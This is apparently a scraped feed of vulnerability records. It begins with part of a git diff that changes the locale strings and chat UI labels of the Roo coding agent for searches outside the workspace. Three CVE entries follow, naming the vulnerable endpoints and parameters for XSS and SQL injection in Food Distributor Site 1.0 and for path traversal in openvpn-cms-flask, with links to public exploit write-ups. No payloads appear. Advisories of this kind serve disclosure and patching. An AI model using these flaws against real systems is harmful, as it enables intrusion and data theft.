 	"toolRepetitionLimitReached": "Roo가 같은 동작({{toolName}})을 반복적으로 시도하면서 루프에 갇힌 것 같습니다. 이는 현재 전략에 문제가 있을 수 있음을 나타냅니다. 작업을 다시 표현하거나, 더 구체적인 지침을 제공하거나, 다른 접근 방식으로 안내해 보세요.",
 	"codebaseSearch": {
 		"approval": "코드베이스에서 '{{query}}' 검색 중..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "워크스페이스 외부에서는 검색할 수 없습니다. 경로 '{{path}}'는 현재 워크스페이스 외부에 있습니다."
 	}
 }
diff --git a/src/i18n/locales/nl/tools.json b/src/i18n/locales/nl/tools.json
index ec8bc50db495..8779caaf382f 100644
--- a/src/i18n/locales/nl/tools.json
+++ b/src/i18n/locales/nl/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo lijkt vast te zitten in een lus, waarbij hij herhaaldelijk dezelfde actie ({{toolName}}) probeert. Dit kan duiden op een probleem met de huidige strategie. Overweeg de taak te herformuleren, specifiekere instructies te geven of Roo naar een andere aanpak te leiden.",
 	"codebaseSearch": {
 		"approval": "Zoeken naar '{{query}}' in codebase..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Kan niet zoeken buiten de werkruimte. Pad '{{path}}' ligt buiten de huidige werkruimte."
 	}
 }
diff --git a/src/i18n/locales/pl/tools.json b/src/i18n/locales/pl/tools.json
index 37b27674988d..1cfb8d59de16 100644
--- a/src/i18n/locales/pl/tools.json
+++ b/src/i18n/locales/pl/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Wygląda na to, że Roo utknął w pętli, wielokrotnie próbując wykonać tę samą akcję ({{toolName}}). Może to wskazywać na problem z jego obecną strategią. Rozważ przeformułowanie zadania, podanie bardziej szczegółowych instrukcji lub nakierowanie go na inne podejście.",
 	"codebaseSearch": {
 		"approval": "Wyszukiwanie '{{query}}' w bazie kodu..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Nie można wyszukiwać poza obszarem roboczym. Ścieżka '{{path}}' znajduje się poza bieżącym obszarem roboczym."
 	}
 }
diff --git a/src/i18n/locales/pt-BR/tools.json b/src/i18n/locales/pt-BR/tools.json
index 0ac272869073..9c03e6082fc0 100644
--- a/src/i18n/locales/pt-BR/tools.json
+++ b/src/i18n/locales/pt-BR/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo parece estar preso em um loop, tentando a mesma ação ({{toolName}}) repetidamente. Isso pode indicar um problema com sua estratégia atual. Considere reformular a tarefa, fornecer instruções mais específicas ou guiá-lo para uma abordagem diferente.",
 	"codebaseSearch": {
 		"approval": "Pesquisando '{{query}}' na base de código..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Não é possível pesquisar fora do espaço de trabalho. O caminho '{{path}}' está fora do espaço de trabalho atual."
 	}
 }
diff --git a/src/i18n/locales/ru/tools.json b/src/i18n/locales/ru/tools.json
index d7471d331ff9..42705f5ec399 100644
--- a/src/i18n/locales/ru/tools.json
+++ b/src/i18n/locales/ru/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Похоже, что Roo застрял в цикле, многократно пытаясь выполнить одно и то же действие ({{toolName}}). Это может указывать на проблему с его текущей стратегией. Попробуйте переформулировать задачу, предоставить более конкретные инструкции или направить его к другому подходу.",
 	"codebaseSearch": {
 		"approval": "Поиск '{{query}}' в кодовой базе..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Невозможно выполнить поиск за пределами рабочего пространства. Путь '{{path}}' находится за пределами текущего рабочего пространства."
 	}
 }
diff --git a/src/i18n/locales/tr/tools.json b/src/i18n/locales/tr/tools.json
index 7f90877e115c..4dff83eac443 100644
--- a/src/i18n/locales/tr/tools.json
+++ b/src/i18n/locales/tr/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo bir döngüye takılmış gibi görünüyor, aynı eylemi ({{toolName}}) tekrar tekrar deniyor. Bu, mevcut stratejisinde bir sorun olduğunu gösterebilir. Görevi yeniden ifade etmeyi, daha spesifik talimatlar vermeyi veya onu farklı bir yaklaşıma yönlendirmeyi düşünün.",
 	"codebaseSearch": {
 		"approval": "Kod tabanında '{{query}}' aranıyor..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Çalışma alanı dışında arama yapılamaz. '{{path}}' yolu mevcut çalışma alanının dışında."
 	}
 }
diff --git a/src/i18n/locales/vi/tools.json b/src/i18n/locales/vi/tools.json
index 2cdd610ced62..67d83f90fc24 100644
--- a/src/i18n/locales/vi/tools.json
+++ b/src/i18n/locales/vi/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo dường như đang bị mắc kẹt trong một vòng lặp, liên tục cố gắng thực hiện cùng một hành động ({{toolName}}). Điều này có thể cho thấy vấn đề với chiến lược hiện tại. Hãy cân nhắc việc diễn đạt lại nhiệm vụ, cung cấp hướng dẫn cụ thể hơn, hoặc hướng Roo theo một cách tiếp cận khác.",
 	"codebaseSearch": {
 		"approval": "Đang tìm kiếm '{{query}}' trong cơ sở mã..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Không thể tìm kiếm bên ngoài không gian làm việc. Đường dẫn '{{path}}' nằm ngoài không gian làm việc hiện tại."
 	}
 }
diff --git a/src/i18n/locales/zh-CN/tools.json b/src/i18n/locales/zh-CN/tools.json
index 301812d919bd..9328251d051e 100644
--- a/src/i18n/locales/zh-CN/tools.json
+++ b/src/i18n/locales/zh-CN/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo 似乎陷入循环，反复尝试同一操作 ({{toolName}})。这可能表明当前策略存在问题。请考虑重新描述任务、提供更具体的指示或引导其尝试不同的方法。",
 	"codebaseSearch": {
 		"approval": "正在搜索代码库中的 '{{query}}'..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "无法在工作区外搜索。路径 '{{path}}' 位于当前工作区外。"
 	}
 }
diff --git a/src/i18n/locales/zh-TW/tools.json b/src/i18n/locales/zh-TW/tools.json
index 10d5b32c1e93..04b16c2bc79b 100644
--- a/src/i18n/locales/zh-TW/tools.json
+++ b/src/i18n/locales/zh-TW/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo 似乎陷入循環，反覆嘗試同一操作 ({{toolName}})。這可能表明目前策略存在問題。請考慮重新描述工作、提供更具體的指示或引導其嘗試不同的方法。",
 	"codebaseSearch": {
 		"approval": "正在搜尋程式碼庫中的「{{query}}」..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "無法在工作區外搜尋。路徑「{{path}}」位於目前工作區外。"
 	}
 }
diff --git a/webview-ui/src/components/chat/ChatRow.tsx b/webview-ui/src/components/chat/ChatRow.tsx
index a40a50ef5324..e71b05be50f3 100644
--- a/webview-ui/src/components/chat/ChatRow.tsx
+++ b/webview-ui/src/components/chat/ChatRow.tsx
@@ -560,13 +560,21 @@ export const ChatRowContent = ({
 							<span style={{ fontWeight: "bold" }}>
 								{message.type === "ask" ? (
 									<Trans
-										i18nKey="chat:directoryOperations.wantsToSearch"
+										i18nKey={
+											tool.isOutsideWorkspace
+												? "chat:directoryOperations.wantsToSearchOutsideWorkspace"
+												: "chat:directoryOperations.wantsToSearch"
+										}
 										components={{ code: <code>{tool.regex}</code> }}
 										values={{ regex: tool.regex }}
 									/>
 								) : (
 									<Trans
-										i18nKey="chat:directoryOperations.didSearch"
+										i18nKey={
+											tool.isOutsideWorkspace
+												? "chat:directoryOperations.didSearchOutsideWorkspace"
+												: "chat:directoryOperations.didSearch"
+										}
 										components={{ code: <code>{tool.regex}</code> }}
 										values={{ regex: tool.regex }}
 									/>
diff --git a/webview-ui/src/i18n/locales/ca/chat.json b/webview-ui/src/i18n/locales/ca/chat.json
index bcc5b64d4fc4..372ae066f9cf 100644
--- a/webview-ui/src/i18n/locales/ca/chat.json
+++ b/webview-ui/src/i18n/locales/ca/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo vol veure noms de definicions de codi font utilitzats en aquest directori:",
 		"didViewDefinitions": "Roo ha vist noms de definicions de codi font utilitzats en aquest directori:",
 		"wantsToSearch": "Roo vol cercar en aquest directori <code>{{regex}}</code>:",
-		"didSearch": "Roo ha cercat en aquest directori <code>{{regex}}</code>:"
+		"didSearch": "Roo ha cercat en aquest directori <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo vol cercar en aquest directori (fora de l'espai de treball) <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo ha cercat en aquest directori (fora de l'espai de treball) <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Sortida de l'ordre",
 	"response": "Resposta",
diff --git a/webview-ui/src/i18n/locales/de/chat.json b/webview-ui/src/i18n/locales/de/chat.json
index f9a8180670cf..451cea47d3c6 100644
--- a/webview-ui/src/i18n/locales/de/chat.json
+++ b/webview-ui/src/i18n/locales/de/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo möchte Quellcode-Definitionsnamen in diesem Verzeichnis anzeigen:",
 		"didViewDefinitions": "Roo hat Quellcode-Definitionsnamen in diesem Verzeichnis angezeigt:",
 		"wantsToSearch": "Roo möchte dieses Verzeichnis nach <code>{{regex}}</code> durchsuchen:",
-		"didSearch": "Roo hat dieses Verzeichnis nach <code>{{regex}}</code> durchsucht:"
+		"didSearch": "Roo hat dieses Verzeichnis nach <code>{{regex}}</code> durchsucht:",
+		"wantsToSearchOutsideWorkspace": "Roo möchte dieses Verzeichnis (außerhalb des Arbeitsbereichs) nach <code>{{regex}}</code> durchsuchen:",
+		"didSearchOutsideWorkspace": "Roo hat dieses Verzeichnis (außerhalb des Arbeitsbereichs) nach <code>{{regex}}</code> durchsucht:"
 	},
 	"commandOutput": "Befehlsausgabe",
 	"response": "Antwort",
diff --git a/webview-ui/src/i18n/locales/en/chat.json b/webview-ui/src/i18n/locales/en/chat.json
index 5a4e3598382a..34236c56363c 100644
--- a/webview-ui/src/i18n/locales/en/chat.json
+++ b/webview-ui/src/i18n/locales/en/chat.json
@@ -172,7 +172,9 @@
 		"wantsToViewDefinitions": "Roo wants to view source code definition names used in this directory:",
 		"didViewDefinitions": "Roo viewed source code definition names used in this directory:",
 		"wantsToSearch": "Roo wants to search this directory for <code>{{regex}}</code>:",
-		"didSearch": "Roo searched this directory for <code>{{regex}}</code>:"
+		"didSearch": "Roo searched this directory for <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo wants to search this directory (outside workspace) for <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo searched this directory (outside workspace) for <code>{{regex}}</code>:"
 	},
 	"codebaseSearch": {
 		"wantsToSearch": "Roo wants to search the codebase for <code>{{query}}</code>:",
diff --git a/webview-ui/src/i18n/locales/es/chat.json b/webview-ui/src/i18n/locales/es/chat.json
index 9a1f0155f569..dc0a49332f2e 100644
--- a/webview-ui/src/i18n/locales/es/chat.json
+++ b/webview-ui/src/i18n/locales/es/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo quiere ver nombres de definiciones de código fuente utilizados en este directorio:",
 		"didViewDefinitions": "Roo vio nombres de definiciones de código fuente utilizados en este directorio:",
 		"wantsToSearch": "Roo quiere buscar en este directorio <code>{{regex}}</code>:",
-		"didSearch": "Roo buscó en este directorio <code>{{regex}}</code>:"
+		"didSearch": "Roo buscó en este directorio <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo quiere buscar en este directorio (fuera del espacio de trabajo) <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo buscó en este directorio (fuera del espacio de trabajo) <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Salida del comando",
 	"response": "Respuesta",
diff --git a/webview-ui/src/i18n/locales/fr/chat.json b/webview-ui/src/i18n/locales/fr/chat.json
index 2abb62905cca..4a7d298fbf08 100644
--- a/webview-ui/src/i18n/locales/fr/chat.json
+++ b/webview-ui/src/i18n/locales/fr/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo veut voir les noms de définitions de code source utilisés dans ce répertoire :",
 		"didViewDefinitions": "Roo a vu les noms de définitions de code source utilisés dans ce répertoire :",
 		"wantsToSearch": "Roo veut rechercher dans ce répertoire <code>{{regex}}</code> :",
-		"didSearch": "Roo a recherché dans ce répertoire <code>{{regex}}</code> :"
+		"didSearch": "Roo a recherché dans ce répertoire <code>{{regex}}</code> :",
+		"wantsToSearchOutsideWorkspace": "Roo veut rechercher dans ce répertoire (hors espace de travail) <code>{{regex}}</code> :",
+		"didSearchOutsideWorkspace": "Roo a recherché dans ce répertoire (hors espace de travail) <code>{{regex}}</code> :"
 	},
 	"commandOutput": "Sortie de commande",
 	"response": "Réponse",
diff --git a/webview-ui/src/i18n/locales/hi/chat.json b/webview-ui/src/i18n/locales/hi/chat.json
index fcfca2f47fa6..c4f7a322bf8f 100644
--- a/webview-ui/src/i18n/locales/hi/chat.json
+++ b/webview-ui/src/i18n/locales/hi/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo इस निर्देशिका में उपयोग किए गए सोर्स कोड परिभाषा नामों को देखना चाहता है:",
 		"didViewDefinitions": "Roo ने इस निर्देशिका में उपयोग किए गए सोर्स कोड परिभाषा नामों को देखा:",
 		"wantsToSearch": "Roo इस निर्देशिका में <code>{{regex}}</code> के लिए खोज करना चाहता है:",
-		"didSearch": "Roo ने इस निर्देशिका में <code>{{regex}}</code> के लिए खोज की:"
+		"didSearch": "Roo ने इस निर्देशिका में <code>{{regex}}</code> के लिए खोज की:",
+		"wantsToSearchOutsideWorkspace": "Roo इस निर्देशिका (कार्यक्षेत्र के बाहर) में <code>{{regex}}</code> के लिए खोज करना चाहता है:",
+		"didSearchOutsideWorkspace": "Roo ने इस निर्देशिका (कार्यक्षेत्र के बाहर) में <code>{{regex}}</code> के लिए खोज की:"
 	},
 	"commandOutput": "कमांड आउटपुट",
 	"response": "प्रतिक्रिया",
diff --git a/webview-ui/src/i18n/locales/it/chat.json b/webview-ui/src/i18n/locales/it/chat.json
index 2007303f7637..4dd56661343b 100644
--- a/webview-ui/src/i18n/locales/it/chat.json
+++ b/webview-ui/src/i18n/locales/it/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo vuole visualizzare i nomi delle definizioni di codice sorgente utilizzate in questa directory:",
 		"didViewDefinitions": "Roo ha visualizzato i nomi delle definizioni di codice sorgente utilizzate in questa directory:",
 		"wantsToSearch": "Roo vuole cercare in questa directory <code>{{regex}}</code>:",
-		"didSearch": "Roo ha cercato in questa directory <code>{{regex}}</code>:"
+		"didSearch": "Roo ha cercato in questa directory <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo vuole cercare in questa directory (fuori dall'area di lavoro) <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo ha cercato in questa directory (fuori dall'area di lavoro) <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Output del comando",
 	"response": "Risposta",
diff --git a/webview-ui/src/i18n/locales/ja/chat.json b/webview-ui/src/i18n/locales/ja/chat.json
index 0cb177fa4bd8..44a472605f2a 100644
--- a/webview-ui/src/i18n/locales/ja/chat.json
+++ b/webview-ui/src/i18n/locales/ja/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Rooはこのディレクトリで使用されているソースコード定義名を表示したい:",
 		"didViewDefinitions": "Rooはこのディレクトリで使用されているソースコード定義名を表示しました:",
 		"wantsToSearch": "Rooはこのディレクトリで <code>{{regex}}</code> を検索したい:",
-		"didSearch": "Rooはこのディレクトリで <code>{{regex}}</code> を検索しました:"
+		"didSearch": "Rooはこのディレクトリで <code>{{regex}}</code> を検索しました:",
+		"wantsToSearchOutsideWorkspace": "Rooはこのディレクトリ（ワークスペース外）で <code>{{regex}}</code> を検索したい:",
+		"didSearchOutsideWorkspace": "Rooはこのディレクトリ（ワークスペース外）で <code>{{regex}}</code> を検索しました:"
 	},
 	"commandOutput": "コマンド出力",
 	"response": "応答",
diff --git a/webview-ui/src/i18n/locales/ko/chat.json b/webview-ui/src/i18n/locales/ko/chat.json
index bde86ec0f0ab..6c73a9c8e475 100644
--- a/webview-ui/src/i18n/locales/ko/chat.json
+++ b/webview-ui/src/i18n/locales/ko/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo가 이 디렉토리에서 사용된 소스 코드 정의 이름을 보고 싶어합니다:",
 		"didViewDefinitions": "Roo가 이 디렉토리에서 사용된 소스 코드 정의 이름을 보았습니다:",
 		"wantsToSearch": "Roo가 이 디렉토리에서 <code>{{regex}}</code>을(를) 검색하고 싶어합니다:",
-		"didSearch": "Roo가 이 디렉토리에서 <code>{{regex}}</code>을(를) 검색했습니다:"
+		"didSearch": "Roo가 이 디렉토리에서 <code>{{regex}}</code>을(를) 검색했습니다:",
+		"wantsToSearchOutsideWorkspace": "Roo가 이 디렉토리(워크스페이스 외부)에서 <code>{{regex}}</code>을(를) 검색하고 싶어합니다:",
+		"didSearchOutsideWorkspace": "Roo가 이 디렉토리(워크스페이스 외부)에서 <code>{{regex}}</code>을(를) 검색했습니다:"
 	},
 	"commandOutput": "명령 출력",
 	"response": "응답",
diff --git a/webview-ui/src/i18n/locales/nl/chat.json b/webview-ui/src/i18n/locales/nl/chat.json
index abd51a5fd572..3ae43f6ddaf1 100644
--- a/webview-ui/src/i18n/locales/nl/chat.json
+++ b/webview-ui/src/i18n/locales/nl/chat.json
@@ -158,7 +158,9 @@
 		"wantsToViewDefinitions": "Roo wil broncode-definitienamen bekijken die in deze map worden gebruikt:",
 		"didViewDefinitions": "Roo heeft broncode-definitienamen bekeken die in deze map worden gebruikt:",
 		"wantsToSearch": "Roo wil deze map doorzoeken op <code>{{regex}}</code>:",
-		"didSearch": "Roo heeft deze map doorzocht op <code>{{regex}}</code>:"
+		"didSearch": "Roo heeft deze map doorzocht op <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo wil deze map (buiten werkruimte) doorzoeken op <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo heeft deze map (buiten werkruimte) doorzocht op <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Commando-uitvoer",
 	"response": "Antwoord",
diff --git a/webview-ui/src/i18n/locales/pl/chat.json b/webview-ui/src/i18n/locales/pl/chat.json
index 5bb6a7259ea4..8be03dcaa540 100644
--- a/webview-ui/src/i18n/locales/pl/chat.json
+++ b/webview-ui/src/i18n/locales/pl/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo chce zobaczyć nazwy definicji kodu źródłowego używane w tym katalogu:",
 		"didViewDefinitions": "Roo zobaczył nazwy definicji kodu źródłowego używane w tym katalogu:",
 		"wantsToSearch": "Roo chce przeszukać ten katalog w poszukiwaniu <code>{{regex}}</code>:",
-		"didSearch": "Roo przeszukał ten katalog w poszukiwaniu <code>{{regex}}</code>:"
+		"didSearch": "Roo przeszukał ten katalog w poszukiwaniu <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo chce przeszukać ten katalog (poza obszarem roboczym) w poszukiwaniu <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo przeszukał ten katalog (poza obszarem roboczym) w poszukiwaniu <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Wyjście polecenia",
 	"response": "Odpowiedź",
diff --git a/webview-ui/src/i18n/locales/pt-BR/chat.json b/webview-ui/src/i18n/locales/pt-BR/chat.json
index d0f3251006df..90a88043b3e8 100644
--- a/webview-ui/src/i18n/locales/pt-BR/chat.json
+++ b/webview-ui/src/i18n/locales/pt-BR/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo quer visualizar nomes de definição de código-fonte usados neste diretório:",
 		"didViewDefinitions": "Roo visualizou nomes de definição de código-fonte usados neste diretório:",
 		"wantsToSearch": "Roo quer pesquisar neste diretório por <code>{{regex}}</code>:",
-		"didSearch": "Roo pesquisou neste diretório por <code>{{regex}}</code>:"
+		"didSearch": "Roo pesquisou neste diretório por <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo quer pesquisar neste diretório (fora do espaço de trabalho) por <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo pesquisou neste diretório (fora do espaço de trabalho) por <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Saída do comando",
 	"response": "Resposta",
diff --git a/webview-ui/src/i18n/locales/ru/chat.json b/webview-ui/src/i18n/locales/ru/chat.json
index 6036ba58c11c..1bf2b002c0fe 100644
--- a/webview-ui/src/i18n/locales/ru/chat.json
+++ b/webview-ui/src/i18n/locales/ru/chat.json
@@ -158,7 +158,9 @@
 		"wantsToViewDefinitions": "Roo хочет просмотреть имена определений исходного кода в этой директории:",
 		"didViewDefinitions": "Roo просмотрел имена определений исходного кода в этой директории:",
 		"wantsToSearch": "Roo хочет выполнить поиск в этой директории по <code>{{regex}}</code>:",
-		"didSearch": "Roo выполнил поиск в этой директории по <code>{{regex}}</code>:"
+		"didSearch": "Roo выполнил поиск в этой директории по <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo хочет выполнить поиск в этой директории (вне рабочего пространства) по <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo выполнил поиск в этой директории (вне рабочего пространства) по <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Вывод команды",
 	"response": "Ответ",
diff --git a/webview-ui/src/i18n/locales/tr/chat.json b/webview-ui/src/i18n/locales/tr/chat.json
index 0aaa9bb30d26..11ac664baa5c 100644
--- a/webview-ui/src/i18n/locales/tr/chat.json
+++ b/webview-ui/src/i18n/locales/tr/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo bu dizinde kullanılan kaynak kod tanımlama isimlerini görüntülemek istiyor:",
 		"didViewDefinitions": "Roo bu dizinde kullanılan kaynak kod tanımlama isimlerini görüntüledi:",
 		"wantsToSearch": "Roo bu dizinde <code>{{regex}}</code> için arama yapmak istiyor:",
-		"didSearch": "Roo bu dizinde <code>{{regex}}</code> için arama yaptı:"
+		"didSearch": "Roo bu dizinde <code>{{regex}}</code> için arama yaptı:",
+		"wantsToSearchOutsideWorkspace": "Roo bu dizinde (çalışma alanı dışında) <code>{{regex}}</code> için arama yapmak istiyor:",
+		"didSearchOutsideWorkspace": "Roo bu dizinde (çalışma alanı dışında) <code>{{regex}}</code> için arama yaptı:"
 	},
 	"commandOutput": "Komut Çıktısı",
 	"response": "Yanıt",
diff --git a/webview-ui/src/i18n/locales/vi/chat.json b/webview-ui/src/i18n/locales/vi/chat.json
index 77e72daef054..54201d74b22b 100644
--- a/webview-ui/src/i18n/locales/vi/chat.json
+++ b/webview-ui/src/i18n/locales/vi/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo muốn xem tên định nghĩa mã nguồn được sử dụng trong thư mục này:",
 		"didViewDefinitions": "Roo đã xem tên định nghĩa mã nguồn được sử dụng trong thư mục này:",
 		"wantsToSearch": "Roo muốn tìm kiếm trong thư mục này cho <code>{{regex}}</code>:",
-		"didSearch": "Roo đã tìm kiếm trong thư mục này cho <code>{{regex}}</code>:"
+		"didSearch": "Roo đã tìm kiếm trong thư mục này cho <code>{{regex}}</code>:",
+		"wantsToSearchOutsideWorkspace": "Roo muốn tìm kiếm trong thư mục này (ngoài không gian làm việc) cho <code>{{regex}}</code>:",
+		"didSearchOutsideWorkspace": "Roo đã tìm kiếm trong thư mục này (ngoài không gian làm việc) cho <code>{{regex}}</code>:"
 	},
 	"commandOutput": "Kết quả lệnh",
 	"response": "Phản hồi",
diff --git a/webview-ui/src/i18n/locales/zh-CN/chat.json b/webview-ui/src/i18n/locales/zh-CN/chat.json
index d4faacbf07ec..f1e0b89cace3 100644
--- a/webview-ui/src/i18n/locales/zh-CN/chat.json
+++ b/webview-ui/src/i18n/locales/zh-CN/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo想查看此目录中使用的源代码定义名称:",
 		"didViewDefinitions": "Roo已查看此目录中使用的源代码定义名称:",
 		"wantsToSearch": "需要搜索内容: {{regex}}",
-		"didSearch": "已完成内容搜索: {{regex}}"
+		"didSearch": "已完成内容搜索: {{regex}}",
+		"wantsToSearchOutsideWorkspace": "需要搜索内容（工作区外）: {{regex}}",
+		"didSearchOutsideWorkspace": "已完成内容搜索（工作区外）: {{regex}}"
 	},
 	"commandOutput": "命令输出",
 	"response": "响应",
diff --git a/webview-ui/src/i18n/locales/zh-TW/chat.json b/webview-ui/src/i18n/locales/zh-TW/chat.json
index 46aa72fa0959..fbb217b4fc92 100644
--- a/webview-ui/src/i18n/locales/zh-TW/chat.json
+++ b/webview-ui/src/i18n/locales/zh-TW/chat.json
@@ -163,7 +163,9 @@
 		"wantsToViewDefinitions": "Roo 想要檢視此目錄中使用的原始碼定義名稱：",
 		"didViewDefinitions": "Roo 已檢視此目錄中使用的原始碼定義名稱：",
 		"wantsToSearch": "Roo 想要在此目錄中搜尋 <code>{{regex}}</code>：",
-		"didSearch": "Roo 已在此目錄中搜尋 <code>{{regex}}</code>："
+		"didSearch": "Roo 已在此目錄中搜尋 <code>{{regex}}</code>：",
+		"wantsToSearchOutsideWorkspace": "Roo 想要在此目錄（工作區外）中搜尋 <code>{{regex}}</code>：",
+		"didSearchOutsideWorkspace": "Roo 已在此目錄（工作區外）中搜尋 <code>{{regex}}</code>："
 	},
 	"commandOutput": "命令輸出",
 	"response": "回應",


================================================================================


CVE ID: CVE-2025-6778
Published: 2025-06-27T21:15:25.087
Modified: 2025-07-11T15:54:52.193
CVSS Score: 2.4 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability, which was classified as problematic, was found in code-projects Food Distributor Site 1.0. Affected is an unknown function of the file /admin/save_settings.php. The manipulation of the argument site_phone/site_email/address leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://code-projects.org/ [Product]
  2. https://github.com/fubxx/CVE/blob/main/Food%20Distributor%20system%20XSS%202.md [Exploit, Third Party Advisory]
  3. https://github.com/fubxx/CVE/blob/main/Food%20Distributor%20system%20XSS%203.md [Exploit, Third Party Advisory]
  4. https://vuldb.com/?ctiid.314094 [Permissions Required, VDB Entry]
  5. https://vuldb.com/?id.314094 [Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.602600 [Third Party Advisory, VDB Entry]
  7. https://vuldb.com/?submit.602601 [Third Party Advisory, VDB Entry]
  8. https://vuldb.com/?submit.602602 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314094 ---
site_phone/site_email/address

================================================================================


CVE ID: CVE-2025-6777
Published: 2025-06-27T21:15:24.830
Modified: 2025-07-11T15:52:23.410
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in code-projects Food Distributor Site 1.0. This issue affects some unknown processing of the file /admin/process_login.php. The manipulation of the argument username/password leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/fubxx/CVE/blob/main/Food%20Distributor%20system%20SQL1.md [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314093 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314093 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602598 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314093 ---
username/password

================================================================================


CVE ID: CVE-2025-6776
Published: 2025-06-27T20:15:35.990
Modified: 2025-06-30T18:38:23.493
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability classified as critical was found in xiaoyunjie openvpn-cms-flask up to 1.2.7. This vulnerability affects the function Upload of the file app/plugins/oss/app/controller.py of the component File Upload. The manipulation of the argument image leads to path traversal. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.2.8 is able to address this issue. The name of the patch is e23559b98c8ea2957f09978c29f4e512ba789eb6. It is recommended to upgrade the affected component.

References (6):
  1. https://github.com/xiaoyunjie/openvpn-cms-flask/commit/e23559b98c8ea2957f09978c29f4e512ba789eb6
  2. https://github.com/xiaoyunjie/openvpn-cms-flask/issues/23
  3. https://github.com/xiaoyunjie/openvpn-cms-flask/releases/tag/v1.2.8
  4. https://vuldb.com/?ctiid.314092
  5. https://vuldb.com/?id.314092
  6. https://vuldb.com/?submit.602374

Attempting to extract code examples from references...

--- Code from https://github.com/xiaoyunjie/openvpn-cms-flask/commit/e23559b98c8ea2957f09978c29f4e512ba789eb6 ---
From e23559b98c8ea2957f09978c29f4e512ba789eb6 Mon Sep 17 00:00:00 2001
